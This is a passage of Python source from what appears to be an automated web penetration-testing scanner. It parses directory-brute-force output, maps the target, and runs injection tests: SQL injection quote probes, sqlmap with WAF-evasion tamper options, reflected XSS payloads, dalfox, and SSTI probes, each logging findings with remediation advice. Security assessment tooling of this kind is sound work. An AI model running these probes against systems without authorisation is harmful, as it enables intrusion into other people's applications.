def _qs_inject(base_url: str, param: str, value: str,
               sess: requests.Session, timeout: int) -> "requests.Response | None":
    try:
        parsed = urllib.parse.urlparse(base_url)
        qs     = urllib.parse.parse_qs(parsed.query)
        qs[param] = [value]
        new_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
        return sess.get(new_url, timeout=timeout)
    except Exception:
        return None


def _strip_url_echo(text: str, r, extra: "list[str] | None" = None) -> str:
    """Remove the echoed request URL — in all encoding variants — from response text.

    Sites that reflect the full URL in their source (canonical tags, breadcrumbs,
    og:url meta, etc.) cause false positives when the injected payload is part of
    the URL.  Stripping every form of the URL leaves only content that was
    independently generated by the server, not passively reflected from the request.

    extra: additional raw string values to also strip in their encoded forms
           (use for probe markers that appear literally inside the URL).
    """
    for variant in (r.url,
                    urllib.parse.unquote(r.url),
                    urllib.parse.unquote_plus(r.url)):
        if variant:
            text = text.replace(variant, "")
    for val in (extra or []):
        for enc in (val,
                    urllib.parse.quote(val, safe=''),
                    urllib.parse.quote_plus(val)):
            if enc:
                text = text.replace(enc, "")
    return text


def _endpoint_dir_name(method: str, url: str) -> str:
    """Return a filesystem-safe directory name for an endpoint: METHOD__safe_path.

    Examples:
        GET  https://example.com/api/v1/users  →  GET__api_v1_users
        POST https://example.com/              →  POST__root
    """
    try:
        path = urllib.parse.urlparse(url).path.strip("/") or "root"
    except Exception:
        path = "root"
    safe_path = re.sub(r'[^\w\-]', '_', path)
    return f"{(method or 'GET').upper()}__{safe_path}"[:80]


def _save_http_evidence(out: "OutputManager", phase: str, label: str,
                        r: "requests.Response", *,
                        endpoint_url: str = "",
                        method: str = "") -> "tuple[str, str]":
    """Write HTTP request/response pair to the phase evidence directory.

    If *endpoint_url* is given the files are written into a per-endpoint
    subdirectory (``METHOD__safe_path/``) inside the phase directory.
    When the base filename already exists an incrementing index suffix
    (_01_, _02_, …) is appended so successive confirmations on the same
    parameter are preserved rather than overwritten.

    Returns (request_file_path, response_file_path).
    """
    safe = re.sub(r'[^\w]', '_', label)[:60]
    if endpoint_url:
        _m = method or (r.request.method if r.request else "GET")
        if out._output_role:
            role_safe = _RE_UNSAFE_FNAME.sub("_", out._output_role)
            ep_dir = out.root / phase / role_safe / _endpoint_dir_name(_m, endpoint_url)
        else:
            ep_dir = out.root / phase / _endpoint_dir_name(_m, endpoint_url)
        ep_dir.mkdir(parents=True, exist_ok=True)
        req_path  = ep_dir / f"{safe}_request.txt"
        resp_path = ep_dir / f"{safe}_response.txt"
        if req_path.exists():
            idx = 1
            while True:
                req_path  = ep_dir / f"{safe}_{idx:02d}_request.txt"
                resp_path = ep_dir / f"{safe}_{idx:02d}_response.txt"
                if not req_path.exists():
                    break
                idx += 1
    else:
        req_path  = out.output_path(phase, f"{safe}_request")
        resp_path = out.output_path(phase, f"{safe}_response")

    prep = r.request
    req_lines = [f"{prep.method} {prep.url}"]
    for k, v in (prep.headers or {}).items():
        req_lines.append(f"{k}: {v}")
    req_lines.append("")
    if prep.body:
        body = prep.body if isinstance(prep.body, str) \
               else prep.body.decode("utf-8", errors="replace")
        req_lines.append(body)
    req_path.write_text("\n".join(req_lines), encoding="utf-8")

    resp_lines = [f"HTTP/1.1 {r.status_code} {r.reason or ''}"]
    for k, v in r.headers.items():
        resp_lines.append(f"{k}: {v}")
    resp_lines.append("")
    resp_lines.append(r.text[:524288])
    resp_path.write_text("\n".join(resp_lines), encoding="utf-8")

    # §13c: record evidence paths relative to the run directory root.
    def _rel(p):
        try:
            return str(p.relative_to(out.root))
        except Exception:
            return str(p)
    return _rel(req_path), _rel(resp_path)


def _parse_gobuster_with_status(filepath: "Path", base_url: str) -> "list[tuple[str, int | None, str | None]]":
    """Parse gobuster output returning (original_url, status_code, redirect_to_url) tuples.
    Handles both gobuster format and the TOP_200_PATHS fallback format."""
    results = []
    base = base_url.rstrip("/")
    for line in filepath.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        status = None
        m_status = re.search(r'\(Status:\s*(\d+)\)|\[(\d{3})\]', line)
        if m_status:
            status = int(m_status.group(1) or m_status.group(2))
        m_redir = re.search(r'-->\s*(https?://[^\]\s]+)', line)
        redirect_to = m_redir.group(1).rstrip("/\\") if m_redir else None
        m_path = re.match(r'(/\S+)', line)
        if m_path:
            results.append((f"{base}{m_path.group(1)}", status, redirect_to))
        elif redirect_to:
            # Line has redirect target but no leading path (unusual) — skip
            pass
    return results


def _parse_feroxbuster_with_status(filepath: "Path") -> "list[tuple[str, int | None, str | None]]":
    """Parse feroxbuster output returning (url, status_code, redirect_to_url) tuples."""
    results = []
    for line in filepath.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        # Format: 301  GET  ...  http://target/admin => http://target/admin/
        m = re.match(r'^(\d{3})\s+\w+\s+.*?(https?://\S+?)(?:\s+=>\s+(https?://\S+))?$', line)
        if m:
            redirect_to = m.group(3).rstrip("/\\") if m.group(3) else None
            results.append((m.group(2).rstrip("/\\"), int(m.group(1)), redirect_to))
            continue
        m2 = re.search(r'(https?://\S+)', line)
        if m2:
            results.append((m2.group(1).rstrip("/\\"), None, None))
    return results


def _sm_normalize_redirect(redirect_url: str, base_host: str) -> "str | None":
    """Normalize a redirect Location to a relative path if it is in-scope, else None."""
    if not redirect_url:
        return None
    try:
        p = urllib.parse.urlparse(redirect_url)
        # Absolute URL — must be same host to be in-scope
        if p.scheme and p.hostname and p.hostname != base_host:
            return None
        return p.path or "/"
    except Exception:
        # Relative redirect (no scheme/host) — treat as-is if it starts with /
        if redirect_url.startswith("/"):
            return redirect_url
        return None


def _write_target_profile(out: "OutputManager", **updates) -> None:
    """Incrementally merge newly discovered information into target_profile.json.

    Each call merges *updates* into the existing profile — non-empty values are
    never overwritten by empty ones, and list/dict fields are merged rather than
    replaced.  Uses the same atomic-rename pattern as _write_structure_map.
    """
    tp_path = out.root / "target_profile.json"
    try:
        existing = json.loads(tp_path.read_text(encoding="utf-8")) if tp_path.exists() else {}
    except Exception:
        existing = {}
    for key, val in updates.items():
        if val is None or val == "" or val == [] or val == {}:
            continue
        if key == "technologies":
            _t_map = {t["name"]: t for t in existing.get("technologies", []) if t.get("name")}
            for t in val:
                n = t.get("name", "")
                if n and (n not in _t_map or (t.get("version") and not _t_map[n].get("version"))):
                    _t_map[n] = t
            existing["technologies"] = list(_t_map.values())
        elif key == "security_headers":
            _eh = existing.get("security_headers", {"present": [], "missing": []})
            for sub in ("present", "missing"):
                _eh[sub] = list(dict.fromkeys(_eh.get(sub, []) + (val.get(sub) or [])))
            existing["security_headers"] = _eh
        elif key == "cookies":
            existing["cookies"] = list(dict.fromkeys(existing.get("cookies", []) + val))
        elif key == "cms":
            _cms = existing.get("cms", [])
            for c in (val if isinstance(val, list) else [val]):
                if c and c not in _cms:
                    _cms.append(c)
            existing["cms"] = _cms
        elif key == "protocols":
            existing["protocols"] = list(dict.fromkeys(existing.get("protocols", []) + val))
        elif key == "bi_tools":
            _bi = existing.get("bi_tools", [])
            for _b in (val if isinstance(val, list) else [val]):
                if _b and _b not in _bi:
                    _bi.append(_b)
            existing["bi_tools"] = _bi
        elif key == "edge_security":
            _es = existing.get("edge_security", [])
            for _e in (val if isinstance(val, list) else [val]):
                if _e and _e not in _es:
                    _es.append(_e)
            existing["edge_security"] = _es
        elif key == "load_balancers":
            _lb = existing.get("load_balancers", [])
            for _l in (val if isinstance(val, list) else [val]):
                if _l and _l not in _lb:
                    _lb.append(_l)
            existing["load_balancers"] = _lb
        elif key == "mfa_providers":
            _mfa = existing.get("mfa_providers", [])
            for _m in (val if isinstance(val, list) else [val]):
                if _m and _m not in _mfa:
                    _mfa.append(_m)
            existing["mfa_providers"] = _mfa
        else:
            if existing.get(key) and not val:
                continue
            existing[key] = val
    existing["last_updated"] = datetime.now().isoformat()
    try:
        _tp_tmp = tp_path.with_suffix(".tmp")
        _tp_tmp.write_text(json.dumps(existing, indent=2), encoding="utf-8")
        _tp_tmp.replace(tp_path)
    except Exception:
        pass


def _write_structure_map(out: "OutputManager", target: dict,
                         crawl_data: "dict | None" = None,
                         extra_urls: "list | None" = None,
                         path_statuses: "dict | None" = None,
                         path_redirects: "dict | None" = None,
                         evidence_files: "list | None" = None,
                         source: "str | None" = None) -> None:
    """Incrementally build and persist structure_map.json.

    Each call merges newly discovered paths into the existing map so information
    accumulates across phases without overwriting earlier data.
    path_statuses: dict of {path: status_code} to record HTTP status per path.
    path_redirects: dict of {path: redirect_url} for in-scope redirect targets.
    evidence_files: list of file paths that produced the new paths (added to the
                    "Web Structure Identified" finding for this target).
    """
    sm_path = out.root / "structure_map.json"
    try:
        existing = json.loads(sm_path.read_text()) if sm_path.exists() else {}
    except Exception:
        existing = {}

    paths: dict = existing.get("paths", {})
    _old_path_keys: set = set(paths.keys())
    base_host = target["hostname"]

    def _add_url(raw_url: str, status: "int | None" = None) -> None:
        try:
            raw_url = raw_url.strip('"\'').strip()
            if not raw_url:
                return
            # Reject anything that looks like an absolute URL to a different host
            if "://" in raw_url:
                p = urllib.parse.urlparse(raw_url)
                if not p.hostname or p.hostname != base_host:
                    return
                path = p.path or "/"
            else:
                path = raw_url if raw_url.startswith("/") else ("/" + raw_url)
            # Strip query/fragment — only the path is stored in structure_map
            path = path.split("?")[0].split("#")[0]
            # Final sanity: path must not contain a scheme fragment
            if "://" in path or not path.startswith("/"):
                return
            # Reject paths containing characters that are never valid unencoded in URL paths
            _BAD = frozenset(['"', "'", '<', '>', '\\', '^', '{', '}', '|', '`',
                               ' ', '\t', '\r', '\n', '\x00', ','])
            if any(c in _BAD for c in path):
                return
            # Validate percent-encoded sequences: % must be followed by exactly two hex digits
            _HEX = frozenset('0123456789abcdefABCDEF')
            i = 0
            while i < len(path):
                if path[i] == '%':
                    if i + 2 >= len(path) or path[i+1] not in _HEX or path[i+2] not in _HEX:
                        return
                    i += 3
                else:
                    i += 1
            # After URL-decoding, reject paths whose segments contain injection artifacts
            try:
                _decoded = urllib.parse.unquote(path, errors='strict')
                if any(c in _decoded for c in ('"', '<', '>')):
                    return
            except Exception:
                return
            entry = paths.setdefault(path, {})
            # HTTP status is write-once: the first writer (Role 1 / most
            # permissive context) sets it and later roles cannot overwrite it.
            # This keeps the Structure tab representative of the application's
            # surface as seen by the highest-privilege session.  Access Matrix
            # per-role statuses are tracked separately and are unaffected.
            if status is not None and "status" not in entry:
                entry["status"] = status
            if source and "source" not in entry:
                entry["source"] = source
        except Exception:
            pass

    if path_statuses:
        for ps_path, ps_status in path_statuses.items():
            _add_url(ps_path, ps_status)

    if path_redirects:
        for pr_path, pr_url in path_redirects.items():
            rt = _sm_normalize_redirect(pr_url, base_host)
            if rt:
                _add_url(pr_path)
                if pr_path in paths:
                    paths[pr_path]["redirect_to"] = rt
                # Register the redirect destination as its own path so it
                # appears in the structure tree and gets probed by the access
                # matrix phase.  Status is left unset — it will be filled in
                # when the path is probed.
                _add_url(rt)

    if crawl_data:
        for lnk in crawl_data.get("links", []):
            _add_url(lnk)
        for form in crawl_data.get("forms", []):
            act = form.get("action", "")
            if act:
                try:
                    p = urllib.parse.urlparse(act)
                    if p.hostname and p.hostname != base_host:
                        continue
                    path = p.path or "/"
                    _add_url(path)
                    if path not in paths:
                        continue
                    entry = paths[path]
                    entry["has_form"] = True
                    if form.get("method"):
                        entry["form_method"] = form["method"].upper()
                    _inps = [i.get("name") for i in form.get("inputs", []) if i.get("name")]
                    if _inps:
                        _ex = set(entry.get("form_inputs", []))
                        _ex.update(_inps)
                        entry["form_inputs"] = sorted(_ex)
                except Exception:
                    pass
        for pe in crawl_data.get("params", []):
            _add_url(pe.get("url", ""))
            try:
                p = urllib.parse.urlparse(pe.get("url", ""))
                path = p.path or "/"
                if path in paths:
                    _ex = set(paths[path].get("params", []))
                    _ex.update(pe.get("params", []))
                    paths[path]["params"] = sorted(_ex)
            except Exception:
                pass

    for eu in (extra_urls or []):
        _add_url(eu)

    if "/" not in paths:
        paths["/"] = {}

    # ── Case-insensitive path dedup for IIS / Windows targets ────────────
    # IIS serves the same resource regardless of URL casing, so feroxbuster
    # discovers /Login/Index AND /Login/index — both 200.  Merge paths that
    # differ only by case, keeping the first-seen casing and merging data.
    try:
        _tp_path = out.root / "target_profile.json"
        _tp = json.loads(_tp_path.read_text(encoding="utf-8")) if _tp_path.exists() else {}
        _srv = (_tp.get("server") or "").lower()
        if "iis" in _srv or "microsoft" in _srv:
            _canon: dict = {}          # lowercase → canonical path key
            _merged: dict = {}         # canonical key → merged entry
            for p in sorted(paths.keys()):
                _pl = p.lower()
                if _pl in _canon:
                    # Merge into existing: keep first-seen key, merge entry data
                    _ck = _canon[_pl]
                    _me = _merged[_ck]
                    for k, v in paths[p].items():
                        if k not in _me:
                            _me[k] = v
                else:
                    _canon[_pl] = p
                    _merged[p] = dict(paths[p])
            paths = _merged
    except Exception:
        pass

    try:
        sm_path.write_text(json.dumps({
            "target":       target["url"],
            "generated_at": datetime.now().isoformat(),
            "paths":        dict(sorted(paths.items())),
        }, indent=2), encoding="utf-8")
    except Exception:
        pass

    # Web Structure findings are no longer emitted incrementally from here.
    # A "No Web Structure Identified" finding is emitted at the end of the
    # first (non-reduced) context pass if no paths were discovered.

    # Keep access_matrix.json in sync with every structure_map update so
    # Crucible can show a growing path list from the very first HTTP probe.
    # Pass no roles — the preliminary write only populates path entries; actual
    # per-role HTTP statuses are filled in by _phase_access_matrix after probing.
    # Seeding statuses here with "unauthenticated" was incorrect because
    # structure_map is updated during authenticated context passes too.
    try:
        _write_preliminary_access_matrix(out, target, [])
    except Exception:
        pass


def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                     out: OutputManager, sess: requests.Session,
                     crawl_data: dict, fast: bool = False,
                     waf_cdn: str = "") -> None:
    phase   = "injection"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    if waf_cdn:
        vc.log(
            f"[injection] WAF/CDN active ({waf_cdn}) — injection probes may be blocked. "
            "Absence of a finding does not confirm absence of the vulnerability. "
            "sqlmap will attempt WAF identification and evasion.",
            "WARNING",
        )
    forms   = crawl_data.get("forms", [])
    params  = crawl_data.get("params", [])
    vc.status(phase, "Injection Testing", "running", "Hidden param discovery (arjun)", 0, 28)

    # 0. arjun — hidden HTTP parameter discovery
    arjun_bin = _find_tool("arjun")
    if arjun_bin and url:
        arjun_out = out.output_path(phase, "arjun_" + target["hostname"] + ".json")
        arjun_cmd = [arjun_bin, "-u", url, "-oJ", str(arjun_out), "-t", "5", "--stable"]
        vc.log("[injection] Running arjun for hidden parameter discovery ...", "INFO")
        try:
            proc = _popen(arjun_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            _arj_stdout, _ = proc.communicate(timeout=300)
            _deregister_proc(proc)
            out.log_command("arjun", arjun_cmd, arjun_out)
            _arj_params: list = []
            _SENSITIVE_PARAM_RE = re.compile(
                r'(?:admin|debug|test|secret|token|key|password|passwd|auth|'
                r'api_?key|private|internal|hidden|backdoor|sudo|root|flag)',
                re.I,
            )
            try:
                with open(arjun_out, "r") as _af:
                    _arj_data = json.load(_af)
                for _arj_url, _arj_methods in _arj_data.items():
                    if isinstance(_arj_methods, dict):
                        for _arj_method, _arj_plist in _arj_methods.items():
                            if isinstance(_arj_plist, list):
                                _arj_params.extend(_arj_plist)
                    elif isinstance(_arj_methods, list):
                        _arj_params.extend(_arj_methods)
            except Exception:
                pass
            if _arj_params:
                _arj_unique = list(dict.fromkeys(_arj_params))
                _existing = set()
                for _pe in params:
                    _existing.update(_pe.get("params", []))
                _new_params = [p for p in _arj_unique if p not in _existing]
                if _new_params and params:
                    params[0]["params"] = list(params[0]["params"]) + _new_params
                elif _new_params:
                    params.append({"url": url, "params": _new_params})
                out.add_finding(
                    title="Hidden HTTP Parameters Discovered",
                    url=url, port=target["port"], risk="INFO",
                    description=(
                        f"arjun discovered {len(_arj_unique)} hidden HTTP parameter(s) "
                        f"not visible in crawled forms or links. These parameters are "
                        f"now included in subsequent injection tests."
                    ),
                    output=f"Parameters: {', '.join(_arj_unique)}",
                    output_file=str(arjun_out),
                    sources="arjun", service=target["scheme"],
                    affected=url, owasp="A05:2025 Security Misconfiguration",
                    nist="CM-7",
                    remediation=(
                        "Remove or disable hidden parameters that are not required "
                        "for application functionality. Document all accepted "
                        "parameters and reject unknown ones."
                    ),
                )
                vc.log(f"[injection] arjun found {len(_arj_unique)} hidden params: "
                       f"{', '.join(_arj_unique[:10])}", "SUCCESS")
                _sensitive = [p for p in _arj_unique if _SENSITIVE_PARAM_RE.search(p)]
                if _sensitive:
                    out.add_finding(
                        title="Security-Sensitive Hidden Parameter",
                        url=url, port=target["port"], risk="LOW",
                        description=(
                            f"arjun discovered hidden parameter(s) with security-sensitive "
                            f"names ({', '.join(_sensitive)}). These may expose debug "
                            f"interfaces, admin functionality, or authentication bypasses."
                        ),
                        output=f"Sensitive parameters: {', '.join(_sensitive)}",
                        output_file=str(arjun_out),
                        sources="arjun", service=target["scheme"],
                        affected=url, owasp="A05:2025 Security Misconfiguration",
                        nist="CM-7",
                        remediation=(
                            "Remove debug/test/admin parameters from production. "
                            "Implement strict parameter whitelisting and reject "
                            "unrecognised parameter names."
                        ),
                    )
                    vc.log(f"[injection] arjun: sensitive params: {', '.join(_sensitive)}", "WARNING")
        except Exception as e:
            out.log_error("arjun", arjun_cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "SQLi heuristic", 1, 28)

    # 1. URL param error-based SQLi — two-probe gated per 2026-06-11 review.
    # The prior code fired CRITICAL on a single ' injection if any SQL-error
    # regex matched the response, which produces false positives on pages
    # that happen to contain documentation about SQLi or framework error
    # text. The confirmation requires:
    #   (a) baseline GET without the payload does NOT match _SQL_ERROR_RE
    #   (b) single-' injection matches _SQL_ERROR_RE
    #   (c) double-'' injection (escaped form) does NOT match _SQL_ERROR_RE
    #       — i.e. the error went away when the quote was syntactically valid
    # When (c) confirms, risk = CRITICAL (true positive). When (c) does not
    # confirm (the error persists), risk = HIGH and title is marked
    # "Suspected" — still worth investigating but not auto-CRITICAL.
    for entry in params:
        purl = entry["url"]
        for param in entry["params"]:
            try: rb = _qs_inject(purl, param, "test", sess, timeout)
            except Exception: rb = None
            if rb and _SQL_ERROR_RE.search(rb.text):
                # Baseline already contains SQL-error text — this page
                # legitimately discusses errors. Skip; emit no finding.
                continue
            r = _qs_inject(purl, param, "test'", sess, timeout)
            if r and _SQL_ERROR_RE.search(r.text):
                try: r2 = _qs_inject(purl, param, "test''", sess, timeout)
                except Exception: r2 = None
                _confirmed = r2 is not None and not _SQL_ERROR_RE.search(r2.text)
                _risk      = "CRITICAL" if _confirmed else "HIGH"
                _title     = ("SQL Injection (Error-Based) — Confirmed" if _confirmed
                              else "SQL Injection (Error-Based) — Suspected, unconfirmed")
                _rq, _rp = _save_http_evidence(out, phase, f"sqli_error_{param}", r, endpoint_url=purl, method="GET")
                out.add_finding(
                    title=_title,
                    url=purl, port=target["port"], risk=_risk,
                    description=("User-controlled input is incorporated into SQL queries "
                                  "without parameterisation, allowing an attacker to read, "
                                  "modify, or delete database contents. "
                                  + ("Two-probe confirmation: '' (escaped) suppresses the "
                                     "error, indicating quote-context injection." if _confirmed
                                     else "NOTE: '' (escaped) probe ALSO triggers the error — "
                                     "may be page-content noise. Manual confirmation advised.")),
                    output=f"Parameter: {param}\nURL: {purl}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection (two-probe gated)", service=target["scheme"],
                    affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] SQLi: {purl} param={param} confirmed={_confirmed}", "SUCCESS")

    vc.status(phase, "Injection Testing", "running", "Form SQLi", 2, 28)
    # 2. Form-based SQLi
    for form in forms[:20]:
        action = form.get("action", url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname:
                continue
            data = {i["name"]: "test" for i in inputs if i.get("name")}
            data[pname] = "test'"
            try:
                # Two-probe gated per 2026-06-11 review (see URL-param path).
                data_b = dict(data); data_b[pname] = "test"
                rb = sess.post(action, data=data_b, timeout=timeout) if method == "POST" \
                    else sess.get(action, params=data_b, timeout=timeout)
                if rb and _SQL_ERROR_RE.search(rb.text):
                    # Baseline already triggers — skip.
                    continue
                r = sess.post(action, data=data, timeout=timeout) if method == "POST" \
                    else sess.get(action, params=data, timeout=timeout)
                if _SQL_ERROR_RE.search(r.text):
                    data2 = dict(data); data2[pname] = "test''"
                    try:
                        r2 = sess.post(action, data=data2, timeout=timeout) if method == "POST" \
                            else sess.get(action, params=data2, timeout=timeout)
                    except Exception: r2 = None
                    _confirmed = r2 is not None and not _SQL_ERROR_RE.search(r2.text)
                    _risk      = "CRITICAL" if _confirmed else "HIGH"
                    _title     = ("SQL Injection (Error-Based) — Confirmed" if _confirmed
                                  else "SQL Injection (Error-Based) — Suspected, unconfirmed")
                    _rq, _rp = _save_http_evidence(out, phase, f"sqli_form_{pname}", r, endpoint_url=action, method=method)
                    out.add_finding(
                        title=_title,
                        url=action, port=target["port"], risk=_risk,
                        description=("User-controlled input is incorporated into SQL queries "
                                      "without parameterisation, allowing an attacker to read, "
                                      "modify, or delete database contents. "
                                      + ("Two-probe confirmation: '' (escaped) suppresses the error."
                                         if _confirmed else
                                         "NOTE: '' (escaped) probe ALSO triggers error — manual confirmation advised.")),
                        output=f"Form: {action}\nField: {pname}\nConfirmed: {_confirmed}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection (two-probe gated)", service=target["scheme"],
                        affected=action, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                        http_code=r.status_code,
                    )
            except Exception:
                pass

    # 3. sqlmap (non-fast)
    if not fast and params:
        sqlmap = _find_tool("sqlmap")
        if sqlmap:
            sq_timeout = cfg.get("sqlmap_timeout", 300)
            sample_url = params[0]["url"]
            sq_dir     = out.root / phase / "sqlmap"
            sq_dir.mkdir(exist_ok=True)
            cmd = [sqlmap, "-u", sample_url, "--batch", "--level=2", "--risk=2",
                   f"--timeout={sq_timeout}", f"--output-dir={sq_dir}",
                   "--random-agent", "--forms"]
            if waf_cdn:
                cmd += ["--identify-waf", "--tamper=space2comment,between,randomcase"]
            vc.log("[injection] Running sqlmap ...", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(proc)
                stdout, _ = proc.communicate(timeout=sq_timeout + 60)
                _deregister_proc(proc)
                out.log_command("sqlmap", cmd, None)
                if re.search(r'Parameter.*is (vulnerable|injectable)', stdout, re.I):
                    _sqm_ev = ""
                    try:
                        _sqm_ev_path = sq_dir / "sqlmap_output.txt"
                        _sqm_ev_path.write_text(stdout, encoding="utf-8")
                        _sqm_ev = str(_sqm_ev_path)
                    except Exception:
                        pass
                    out.add_finding(
                        title="SQL Injection Confirmed by sqlmap",
                        url=sample_url, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                        output=stdout[:2000], sources="sqlmap",
                        service=target["scheme"],
                        output_file=_sqm_ev,
                        owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                    )
            except Exception as e:
                out.log_error("sqlmap", cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "XSS", 3, 28)
    # 4. Reflected XSS
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for payload in _XSS_PAYLOADS[:3]:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r and _xss_confirmed(payload, r):
                    _rq, _rp = _save_http_evidence(out, phase, f"xss_{param}", r, endpoint_url=purl, method="GET")
                    # v1.1 inline validation — independently re-test with a benign
                    # marker. Confidence populated in the finding dict so consumers
                    # can show Firm/Tentative/Cannot reproduce alongside the finding.
                    _conf, _detail = ("", "")
                    try:
                        import sys as _s
                        if "/opt/pr0t31n/shared" not in _s.path:
                            _s.path.insert(0, "/opt/pr0t31n/shared")
                        import pr0t31n_validators as _pv
                        def _val_get(url, headers=None, timeout=8):
                            _r = sess.get(url, headers=headers or {}, timeout=timeout,
                                          verify=False, allow_redirects=False)
                            return _r.status_code, dict(_r.headers), _r.content
                        _conf, _detail = _pv.validate_reflected_xss(
                            purl, param, http_get=_val_get, timeout=8)
                    except ImportError:
                        pass
                    except Exception as _e:
                        _conf, _detail = ("Tentative", f"validator error: {_e}")
                    _desc = ("User-controlled input is reflected or stored and rendered in a "
                             "browser context without proper encoding, enabling arbitrary "
                             "script execution.")
                    if _detail:
                        _desc += f"\n\n[Inline validation] {_detail}"
                    _xss_ss = _capture_xss_screenshot(
                        purl, out, phase, f"reflected_xss_{param}",
                        target, cfg, auth_session=sess)
                    out.add_finding(
                        title="Reflected Cross-Site Scripting (XSS)",
                        url=purl, port=target["port"], risk="HIGH",
                        description=_desc,
                        output=f"Parameter: {param}\nPayload: {payload}",
                        output_file=f"{_rq},{_rp}" + (f",{_xss_ss}" if _xss_ss else ""),
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Encode all output contextually (HTML, JS, URL, CSS), sanitise stored input server-side, and enforce a strict Content-Security-Policy.",
                        http_code=r.status_code,
                    )
                    # Stash confidence on the freshly-written finding via the
                    # augment helper — finding_id is unknown here so we'll add
                    # at scan-completion via augment_findings_file. For now,
                    # log the validation outcome so the operator sees it live.
                    if _conf:
                        vc.log(f"[injection] XSS validated: {_conf} — {_detail}",
                               "INFO" if _conf in ("Firm", "Certain") else "WARNING")
                    vc.log(f"[injection] XSS: {purl} param={param}", "SUCCESS")
                    break

    # dalfox — with FP filtering for encoded/path/infrastructure payloads
    dalfox = _find_tool("dalfox")
    if dalfox and params:
        df_out = out.output_path(phase, "dalfox_" + target["hostname"])
        cmd    = [dalfox, "url", params[0]["url"], "--silence", "--output", str(df_out)]
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout, _ = proc.communicate(timeout=120)
            _deregister_proc(proc)
            out.log_command("dalfox", cmd, df_out)
            # Filter dalfox POC lines to remove high-FP patterns:
            #  - Double/triple URL-encoding (%25XX) — browsers don't multi-decode
            #  - ASP.NET infra params (__VIEWSTATE, __EVENTVALIDATION, etc.)
            #  - Payload injected into URL path (before ?) rather than query params
            _ASPNET_INFRA_RE = re.compile(
                r'__VIEWSTATE|__EVENTVALIDATION|__VIEWSTATEGENERATOR|'
                r'__PREVIOUSPAGE|__ASYNCPOST', re.I)
            _valid_pocs = []
            for _dl in stdout.splitlines():
                _dl = _dl.strip()
                if "[POC]" not in _dl:
                    continue
                # Extract the URL from the POC line
                _dm = re.search(r'(https?://\S+)', _dl)
                if not _dm:
                    continue
                _durl = _dm.group(1)
                # Reject double/triple-encoded payloads — %25 is encoded %
                if "%25" in _durl:
                    vc.log(f"[injection] dalfox: skipping multi-encoded POC (high FP risk)", "INFO")
                    continue
                # Reject ASP.NET infrastructure parameter injection
                _dq = urllib.parse.urlparse(_durl).query
                if _ASPNET_INFRA_RE.search(_dq):
                    vc.log(f"[injection] dalfox: skipping ASP.NET infra param POC (__VIEWSTATE etc.)", "INFO")
                    continue
                # Reject path-injected payloads — payload is in the path, not a query param.
                # Check both raw and URL-decoded path — dalfox percent-encodes
                # special chars (%22 = ", %3E = >, %3C = <, %27 = ') so the
                # raw path won't contain the literal char.
                _dp_raw = urllib.parse.urlparse(_durl).path
                _dp_dec = urllib.parse.unquote(_dp_raw)
                if (any(c in _dp_raw for c in ('<', '>', '"', "'", '='))
                        or any(c in _dp_dec for c in ('<', '>', '"', "'", '='))):
                    vc.log(f"[injection] dalfox: skipping path-injection POC (malformed URL)", "INFO")
                    continue
                _valid_pocs.append(_dl)
            if _valid_pocs:
                _df_ss_url = params[0]["url"]
                _df_m = re.search(r'(https?://\S+)', _valid_pocs[0])
                if _df_m:
                    _df_ss_url = _df_m.group(1)
                _df_ss = _capture_xss_screenshot(
                    _df_ss_url, out, phase, "dalfox_xss",
                    target, cfg, auth_session=sess)
                out.add_finding(
                    title="XSS Confirmed by dalfox",
                    url=params[0]["url"], port=target["port"], risk="HIGH",
                    description="dalfox confirmed XSS.",
                    output="\n".join(_valid_pocs)[:2000], sources="dalfox",
                    service=target["scheme"],
                    output_file=str(df_out) + (f",{_df_ss}" if _df_ss else ""),
                    owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Encode all user output. Implement CSP.",
                )
            elif "[POC]" in stdout:
                vc.log("[injection] dalfox reported POCs but all were filtered as likely FPs "
                       "(multi-encoded, infra params, or path injection)", "INFO")
        except Exception as e:
            out.log_error("dalfox", cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "SSTI", 4, 28)
    # 5. SSTI
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for payload, expected in _ssti_probes():
                r = _qs_inject(purl, param, payload, sess, timeout)
                if not r:
                    continue
                _ssti_body = r.text
                for _enc in (r.url,
                             urllib.parse.unquote(r.url),
                             urllib.parse.unquote_plus(r.url),
                             payload,
                             urllib.parse.quote(payload),
                             urllib.parse.quote_plus(payload)):
                    _ssti_body = _ssti_body.replace(_enc, "")
                if expected in _ssti_body:
                    _rq, _rp = _save_http_evidence(out, phase, f"ssti_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
